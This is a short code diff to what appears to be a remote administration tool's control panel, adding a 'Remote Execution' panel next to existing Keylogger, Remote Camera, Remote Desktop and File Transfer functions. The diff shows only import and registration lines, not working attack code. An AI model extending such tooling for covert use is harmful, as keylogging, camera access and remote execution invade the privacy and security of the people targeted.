@@ -17,6 +17,7 @@ from RATFunction.RATFunctionUI import RATFunctionUI
 from RATFunction.RemoteCameraUI import RemoteCameraUI
 from RATFunction.RemoteDesktopUI import RemoteDesktopUI
 from RATFunction.MyLoggingUI import MyLoggingUI
+from RATFunction.RemoveExecutionUI import RemoteExecutionUI
 
 
 class AdminNetworkThread(QThread):
@@ -59,6 +60,7 @@ class AdministratorControlPanel(QWidget):
         self.add_control_panel_function('Keylogger', 3, MyLoggingUI)
         self.add_control_panel_function('Remote Camera', 4, RemoteCameraUI)
         self.add_control_panel_function('File Transfer', 5, FileTransferUI)
+        self.add_control_panel_function('Remote Execution', 6, RemoteExecutionUI)
 
         self.reconnect()
 
